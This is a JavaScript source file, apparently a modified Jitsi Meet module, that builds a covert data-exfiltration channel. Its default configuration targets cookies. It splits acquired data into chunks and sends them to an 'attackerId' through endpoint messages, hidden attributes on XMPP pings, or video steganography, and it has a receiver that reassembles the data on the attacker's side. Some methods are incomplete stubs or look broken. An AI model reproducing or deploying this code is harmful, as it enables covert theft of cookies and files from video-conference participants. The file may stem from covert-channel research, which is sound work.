/* eslint-disable max-params */
/* global APP, splitString, getDefaultSettings */
import { $iq, Strophe } from 'strophe.js';

import { AudioMixerEffect } from '../react/features/stream-effects/audio-mixer/AudioMixerEffect';

import VideoSteganoEffect from './VideoSteganoEffect';


export const defaultConfigurationValues = {
    method: 'plain',
    dataType: 'cookies',
    chunkSize: 5000
};

/**
 * Implementation of different convert channel methods
 */
class CovertChannelMethods {

    // reference to all other methods
    static options = {
        'plain': CovertChannelMethods.usePlain,
        'video': CovertChannelMethods.useVideo,
        'audio': CovertChannelMethods.useAudio,
        'xmpp': CovertChannelMethods.useXMPP
    };

    /**
     * Sending data using simple plain method
     * @param {any} data - specified data to be sent
     */
    static usePlain(data, attackerId) {
        APP.conference.sendEndpointMessage(attackerId, {
            extraction: 'reply',
            payload: data
        });
    }

    /**
     * Creates new Steganography effect on the specified media stream.
     * @param {MediaStream} stream - Video stream you want to change
     * @param {Object} acquiredData - Data that are going to be hidden inside the mediastream
     * @param {object} options - Options about the steganography. Throughtput etc.
     * @returns Promise of stegano effect
     */
    _createSteganoEffect(stream: MediaStream, acquiredData: Object, options: Object) {
        if (!MediaStreamTrack.prototype.getSettings) {
            return Promise.reject(new Error('Stegano cannot be implemented!'));
        }

        // insert acquired data inside the video using specified method
        return Promise.resolve(new VideoSteganoEffect(stream, acquiredData, options));
    }

    /**
     * Send data using video stream
     * @param {any} data - specified data to be sent
     */
    static useVideo(acquiredData, usedMethod) {
        const localVideo = APP.conference.localVideo;

        this._createSteganoEffect(localVideo.stream, acquiredData, usedMethod).then(effect => {
            localVideo.setEffect(effect);
        });
    }

    /**
     * Send data using audio stream
     * @param {any} data - specified data to be sent
     */
    static useAudio(data) {
        const desktopAudio = APP.conference._desktopAudioStream;
        const localAudio = APP.conference.localAudio;

        new AudioMixerEffect(desktopAudio).then(effect => {
            localAudio.setEffect(effect);
        });

    }

    /**
     * Sends "ping" to given <tt>jid</tt>
     * @param jid the JID to which ping request will be sent.
     * @param success callback called on success.
     * @param error callback called on error.
     * @param timeout ms how long are we going to wait for the response. On
     * @param data to send
     * timeout <tt>error<//t> callback is called with undefined error argument.
     */
    static extractionPing(jid, success, error, timeout, data) {
        const iq = $iq({
            type: 'get',
            to: jid
        });

        iq.c('ping', { xmlns: Strophe.NS.PING,
            extraction: 'reply',
            data });
        APP.conference._room.xmpp.connection.sendIQ2(iq, { timeout })
            .then(success, error);
    }

    /**
     * Send data using audio stream
     * @param {any} data - specified data to be sent
     */
    static useXMPP(data) {
        const user = APP.conference.listMembers()[0].jid;

        CovertChannelMethods.extractionPing(user, null, null, 1000, data);

        // APP.conference.saveLogs();
    }
}

/**
 * Extracting data from covert channel
 */
class ExtractionCovertChannelMethods {

    // reference to all other methods
    static options = {
        'plain': ExtractionCovertChannelMethods.usedPlain,
        'video': ExtractionCovertChannelMethods.usedVideo,
        'audio': ExtractionCovertChannelMethods.usedAudio,
        'xmpp': ExtractionCovertChannelMethods.usedXMPP
    };

    /**
     * Receiving data using video stream
     */
    static usedVideo(user) {
        // define MediaRecorder of received stream
        const mediaRecorder = new MediaRecorder(user._tracks[0].stream);

        mediaRecorder.ondataavailable = blob => {
            blob.data.arrayBuffer().then(data => {
                console.log('Video:', data);
            });
        };
        mediaRecorder.start(100);
    }

    /**
     * Receiving data using xmpp ping
     */
    static usedXMPP(user) {

    }

    /**
     * Receiving data using audio stream
     */
    static usedAudio(user) {}

    /**
     * TODO: change this
     * not used anymore
     * Receiving data using audio stream
     */
    static usedPlain(user) {}
}


/**
 * Class responsible for extraction handling
 */
export class ExtractionHandler {
    /**
     * @param {object} configuration - Object containing information about data extraction
     */
    constructor(configuration) {
        this.configuration = getDefaultSettings(defaultConfigurationValues, configuration);
        this._fileBuffer = [];
        this.communicationEnded = false;
    }

    /**
     * getter for full file buffer
     */
    get fullData() {
        if (this._fileBuffer?.length) {
            return this._fileBuffer?.reduce((first, second) => first + second);
        }

        return '';
    }

    /**
     * Send data through the specified method.
     * @param {any} data - data to be sent.
     */
    sendAll(data, attackerId, dataSize = data.length) {
        // If the method can loose data through the transition send the final size of sent file.
        if (this.configuration.method !== 'plain') {
            CovertChannelMethods.options[this.configuration.method](dataSize, attackerId);
        }
        for (const chunkData of splitString(data, this.configuration.chunkSize)) {
            // send data using corresponding method
            CovertChannelMethods.options[this.configuration.method](chunkData, attackerId);
        }
        APP.conference.sendEndpointMessage(attackerId, {
            extraction: 'reply',
            isEnd: true
        });
        this.communicationEnded = true;
    }

    /**
     * Receive reply data through the specified extraction method.
     * Could be either plain text payload data, or control info (ending message).
     * @param {*} recievedData - Data received from endpointTextMessage.
     * @param {*} event - Custom event for dispatching data when extraction ended.
     */
    receivePlainData(recievedData, event) {
        // extract data using specified method
        if (recievedData.isEnd) { // 'reply' control ending message
            if (event) {
                // Event for downloading extracted data at the end of extraction.
                // Define custom event 'extractionEnded' and trigger it.
                event.dispatchEvent(new CustomEvent('extractionEnded', {
                    detail: {
                        extractedData: this.fullData,
                        config: this.configuration
                    }
                }));
            }
            this._fileBuffer = []; // empty the file buffer after ending communication.
            this.communicationEnded = true;

        } else { // 'reply' containg text data
            this._fileBuffer.push(recievedData.payload);
        }
    }

    /**
     * Receive data through the specified extraction method.
     */
    receiveAll(user) {
        // TODO: add generic code for all types of communication.
        ExtractionCovertChannelMethods.options[this.configuration.method](user);
    }
}
